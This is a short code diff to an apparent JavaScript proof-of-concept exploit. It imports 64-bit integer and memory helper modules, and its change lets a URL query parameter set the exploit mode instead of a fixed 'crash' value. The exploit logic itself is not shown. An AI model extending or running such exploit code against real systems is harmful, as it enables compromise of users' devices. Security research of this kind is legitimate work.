@@ -3,7 +3,15 @@ import { Int } from './module/int64.mjs';
 import { Memory } from './module/mem.mjs';
 import { MB } from './module/constants.mjs';
 
-const POC_MODE = 'crash';
+const POC_MODE = (() => {
+    try {
+        const qs = globalThis?.location?.search ?? '';
+        const v = new URLSearchParams(qs).get('mode');
+        return v ?? 'crash';
+    } catch {
+        return 'crash';
+    }
+})();
 
 function sleep(ms = 20) {
     return new Promise(resolve => setTimeout(resolve, ms));
@@ -109,6 +117,7 @@ function createObjectStructure(num_elems) {
  
 export async function main() {
     debug_log("[*] Exploit started...");
+    debug_log('[*] Mode: ' + String(POC_MODE));
     
     const num_elems = 1600;
     let root = createObjectStructure(num_elems);
